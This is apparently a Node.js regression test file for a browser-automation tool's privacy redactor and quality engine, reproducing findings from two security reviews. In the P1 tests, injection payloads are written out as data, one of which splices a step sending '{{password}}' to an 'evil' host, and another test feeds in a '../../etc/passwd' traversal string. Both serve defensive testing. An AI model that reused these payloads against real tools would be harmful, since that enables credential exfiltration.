// Regression tests for the findings of the two independent reviews (privacy/resource bounds, compatibility/correlation).
// Each test reproduces one finding. Run with: node --test bench/unit-review.mjs   (after npm run build)
import test from 'node:test';
import assert from 'node:assert/strict';
import { Redactor, MASK, html } from '../dist/privacy/redact.js';
import { parseConfig } from '../dist/config.js';
import { ActionTracker } from '../dist/correlation/actions.js';
import { QualityEngine } from '../dist/quality/engine.js';
import { pathMatches } from '../dist/util/paths.js';
import { safe } from '../dist/dirs.js';

const cfg = (raw = {}, opts = {}) => parseConfig(raw, { env: {}, ...opts });
let rid = 0;
const rec = (o = {}) => ({ id: `R-${++rid}`, method: 'POST', url: 'http://shop.test/api/orders', origin: 'http://shop.test', path: '/api/orders', route: '/api/orders', resourceType: 'fetch', firstParty: true, tracked: true, navigation: false, association: { actionId: 'A-1', confidence: 'inferred', reason: 'request started during the action' }, batchId: 'B-1', startedMs: 0, eventIds: [], done: false, ...o });
const engine = (raw = {}, scope = undefined) => new QualityEngine(cfg(raw), { scopeOf: () => scope, currentBatchId: () => 'B-1', describeAction: () => '', isReported: () => false });

// ------------------------------------------------------------------ privacy review
test('P1 critical: a page-controlled parameter name can never be spliced into flows, specs or JSON', () => {
  const r = new Redactor();
  const label = 'x}}"},{"do":"goto","value":"https://evil/?token={{password}}"},{"do":"wait","code":"{{token_y';
  r.networkUrl(`https://x/?${encodeURIComponent(label)}=await%20page`);
  const flow = JSON.stringify({ steps: [{ do: 'click', code: 'await page.getByRole("button").click();' }] });
  assert.equal(r.knownOnly(flow), flow, 'values learned from the page never rewrite a flow or a spec');
  const shown = r.text('await page.click()');
  assert.ok(!shown.includes('{{') && !shown.includes('evil'), shown);
  assert.equal(shown, `${MASK}.click()`, 'a learned value is hidden behind a fixed mask, never a label');
});
test('P1: only bound {{placeholders}} keep their name, and the name is always a plain word', () => {
  const r = new Redactor();
  r.addSecret('hunter2-secret', 'pass}}"; evil(); "{{x');
  assert.equal(r.knownOnly('value is hunter2-secret'), 'value is {{pass_evil_x}}');
});
test('P2: redaction is linear on hostile input', () => {
  const r = new Redactor();
  for (const s of ['a-'.repeat(40000), 'token '.repeat(20000), 'password=' + 'x'.repeat(300000), '"'.repeat(100000), 'Bearer ' + 'A'.repeat(200000)]) {
    const t = performance.now(); r.text(s);
    assert.ok(performance.now() - t < 400, `${s.slice(0, 12)}… took ${Math.round(performance.now() - t)}ms`);
  }
});
test('P3: values are sanitized before serialization, so artifacts stay valid JSON', () => {
  const r = new Redactor();
  const ev = { kind: 'console_error', data: { text: 'bad link <a href="/r?token=abc123secret">x</a> and "quoted"', n: 3 } };
  const line = JSON.stringify(r.deep(ev));
  const back = JSON.parse(line);
  assert.ok(!line.includes('abc123secret')); assert.equal(back.data.n, 3); assert.match(back.data.text, /token=•••/);
});
test('P4: a bound secret is never dropped when many values were learned, and escaped or clipped forms are hidden too', () => {
  const r = new Redactor();
  for (let i = 0; i < 700; i++) r.networkUrl(`https://s3.test/f${i}?X-Amz-Signature=sig${i}0123456789abcdef`);
  r.addSecret('pa"ss\\word-9', 'password');
  const long = 'tok_' + 'A1b2C3d4'.repeat(8);
  r.addSecret(long, 'apiToken');
  assert.equal(r.text('typed pa"ss\\word-9 here'), 'typed {{password}} here');
  assert.ok(!r.text(JSON.stringify({ msg: 'value is pa"ss\\word-9' })).includes('word-9'), 'JSON-escaped form');
  assert.ok(!r.knownOnly(JSON.stringify('pa"ss\\word-9')).includes('word-9'), 'escaped form in a flow file');
  const clipped = `textbox "Key" ="${long.slice(0, 39)}…"`;
  assert.equal(r.text(clipped), 'textbox "Key" ="{{apiToken}}"', 'a clipped prefix of a long secret is hidden');
  assert.equal(r.text('sig6990123456789abcdef'), MASK, 'recent learned values still work');
});
test('P5: URL credentials and JSON-looking secrets in free text; children of secret-named objects', () => {
  const r = new Redactor();
  assert.equal(r.text('goto "https://admin:s3cretpw@host.test/a"'), 'goto "https://host.test/a"');
  assert.equal(r.text('response was {"user":"jane","password":"hunter2abc"}'), `response was {"user":"jane","password":"${MASK}"}`);
  assert.deepEqual(r.json({ session: { id: 'abc123xyz', ttl: 5 }, name: 'Jane' }), { session: { id: MASK, ttl: MASK }, name: 'Jane' });
});
test('P6: ordinary parameter names are not secrets (author, passengers, discard, cardType is)', () => {
  const r = new Redactor();
  for (const k of ['author', 'passengers', 'discard', 'authority', 'keyboard', 'monkey', 'pinned', 'tokenizer_count']) assert.equal(r.isSecretKey(k), false, k);
  for (const k of ['password', 'Password2', 'access_token', 'accessToken', 'api_key', 'apiKey', 'x-api-key', 'Authorization', 'sessionId', 'card_number', 'client_secret', 'X-Amz-Signature', 'csrfToken', 'pin']) assert.equal(r.isSecretKey(k), true, k);
  assert.equal(r.pageUrl('https://shop.test/books?author=Stephen+King'), 'https://shop.test/books?author=Stephen+King');
  assert.equal(r.text('button "Stephen King"'), 'button "Stephen King"');
  assert.throws(() => cfg({ privacy: { secretKeys: [''] } }), /secretKeys/);
});
test('P8: report text is valid XML and HTML even with control characters', () => {
  assert.equal(html('a\x1b[31mred\x00\x08<b>'), 'a[31mred&lt;b&gt;');
});
test('P7: findings and counters are bounded', () => {
  const e = engine({ quality: { performance: { maxCalls: [{ path: '/api/**', max: 1000 }] } } });
  for (let i = 0; i < 1200; i++) e.onConsoleError({ eventId: `E-${i}`, sequence: i, at: '', batchId: 'B-1', kind: 'console_error', data: { text: `unique error ${[...String(i)].map((d) => 'abcdefghij'[d]).join('')}` }, action: { confidence: 'unattributed', reason: '' } });
  assert.ok(e.findings.length <= 500, `${e.findings.length} findings`); assert.ok(e.findingsDropped > 0);
});
test('paths: a pattern with several wildcards cannot go polynomial on a long path', () => {
  const t = performance.now();
  assert.equal(pathMatches('/x/a*a*a*b', '/x/' + 'a'.repeat(4000)), false);
  assert.ok(performance.now() - t < 200, `${Math.round(performance.now() - t)}ms`);
});
test('safe() keeps 0.3 file names (leading dots are not stripped) and never yields a path separator', () => {
  assert.equal(safe('.hidden flow'), '.hidden-flow'); assert.equal(safe('../../etc/passwd'), '..-..-etc-passwd');
});

// ------------------------------------------------------------------ compatibility / correlation review
test('C3: a suppression covers only the occurrences it matches, not the whole deduplicated finding', () => {
  const sup = { quality: { mode: 'strict', suppressions: [{ id: 'BUG-1', ruleId: 'NET-5XX', path: '/api/reports/42', reason: 'known' }] } };
  for (const order of [['42', '7'], ['7', '42']]) {
    const e = engine(sup);
    for (const id of order) e.onResponse(rec({ status: 500, method: 'GET', path: `/api/reports/${id}`, route: '/api/reports/{id}' }));
    assert.equal(e.findings.length, 1); assert.equal(e.findings[0].status, 'candidate', `order ${order}`);
    assert.equal(e.policy({ pending: 0, dropped: 0, final: true }).outcome, 'failed', 'an unsuppressed 500 must fail strict');
  }
  const only = engine(sup); only.onResponse(rec({ status: 500, method: 'GET', path: '/api/reports/42', route: '/api/reports/{id}' }));
  assert.equal(only.findings[0].status, 'suppressed');
});
test('C5: a known finding that happens again is surfaced again and counts for the batch policy', () => {
  const e = engine({ quality: { mode: 'strict' } });
  e.onResponse(rec({ status: 500 }));
  let n = e.takeNew(); assert.equal(n.fresh.length, 1); assert.equal(n.recurring.length, 0);
  n = e.takeNew(); assert.equal(n.fresh.length + n.recurring.length, 0, 'nothing new: nothing listed');
  e.onResponse(rec({ status: 500 }));
  n = e.takeNew(); assert.equal(n.fresh.length, 0); assert.equal(n.recurring.length, 1);
  assert.equal(e.policy({ findings: [...n.fresh, ...n.recurring], pending: 0, dropped: 0, final: false }).outcome, 'failed');
});
test('C5: a finding that was expected first and then happens unexpectedly is surfaced', () => {
  const e = engine();
  const a = rec({ status: 422 }); e.onResponse(a); e.markExpected(a.id, 'explicit');
  assert.equal(e.takeNew().fresh.length, 0);
  e.onResponse(rec({ status: 422 }));
  const n = e.takeNew(); assert.equal(n.fresh.length + n.recurring.length, 1);
});
function tracker(windowMs = 1500) { let now = 0; const t = new ActionTracker(windowMs, () => now); return { t, at: (ms) => { now = ms; } }; }
const req = (key) => ({ endpointKey: key, mainFrameNavigation: false });
test('C6: a request that starts while the step itself executes is never demoted to background or periodic', () => {
  const { t, at } = tracker(); t.beginBatch('act');
  at(0); t.associate(req('POST http://x/graphql')); at(5000); t.associate(req('POST http://x/graphql')); // two page-initiated calls
  const seen = [];
  for (let i = 0; i < 5; i++) { // five identical steps at machine cadence
    at(6000 + i * 200); const a = t.beginAction('click', 'click "Add"');
    at(6000 + i * 200 + 5); seen.push(t.associate(req('POST http://x/graphql')).confidence);
    t.executed(a); at(6000 + i * 200 + 150); t.endAction(a, true);
  }
  assert.deepEqual(seen, ['inferred', 'inferred', 'inferred', 'inferred', 'inferred']);
});
test('C6: polling that lands in the settle phase of an action is still recognised as background', () => {
  const { t, at } = tracker(); t.beginBatch('act');
  at(0); t.associate(req('GET http://x/poll')); at(300); t.associate(req('GET http://x/poll'));
  at(600); const a = t.beginAction('click', 'click "Save"'); at(620); t.executed(a);
  at(900); const p = t.associate(req('GET http://x/poll'));
  assert.equal(p.confidence, 'ambiguous'); assert.match(p.reason, /background traffic/);
});
test('C6: PERF-CALLS counts requests whose association is ambiguous', () => {
  const e = engine({ quality: { performance: { maxCalls: [{ path: '/api/prices', max: 3, per: 'action' }] } } });
  for (let i = 0; i < 8; i++) e.onRequestStart(rec({ method: 'GET', path: '/api/prices', route: '/api/prices', association: { candidateActionIds: ['A-4', 'A-3'], confidence: 'ambiguous', reason: 'x' } }));
  assert.equal(e.findings.filter((f) => f.ruleId === 'PERF-CALLS').length, 1);
});
test('C6: a later background occurrence lowers confidence but keeps the action that was first associated', () => {
  const e = engine();
  e.onResponse(rec({ status: 500 }));
  e.onResponse(rec({ status: 500, association: { confidence: 'unattributed', reason: 'background' } }));
  assert.equal(e.findings[0].association.actionId, 'A-1'); assert.equal(e.findings[0].confidence, 'low');
});
test('P4: a business rule finding shows the sanitized value, not the raw one', () => {
  const e = engine({ quality: { businessRules: [{ id: 'TOKEN-ABSENT', path: '/api/orders', jsonPointer: '/session/token', exists: false }] } });
  const r = rec({ status: 200, body: { state: 'captured', json: { session: { token: MASK } } } });
  e.onBody(r, { session: { token: 'CANARY-TOKEN-9f3k2' } });
  assert.equal(e.findings.length, 1); assert.ok(!JSON.stringify(e.findings[0]).includes('CANARY'), JSON.stringify(e.findings[0]));
});
test('a rule that throws while evaluating a hostile body is recorded as not evaluated, never a crash', () => {
  const e = engine({ quality: { businessRules: [{ id: 'DEEP', path: '/api/orders', jsonPointer: '/a', equals: { ok: true } }] } });
  let deep = {}; const root = deep; for (let i = 0; i < 20000; i++) { deep.a = {}; deep = deep.a; }
  assert.doesNotThrow(() => e.onBody(rec({ status: 200, body: { state: 'captured', json: {} } }), root));
});
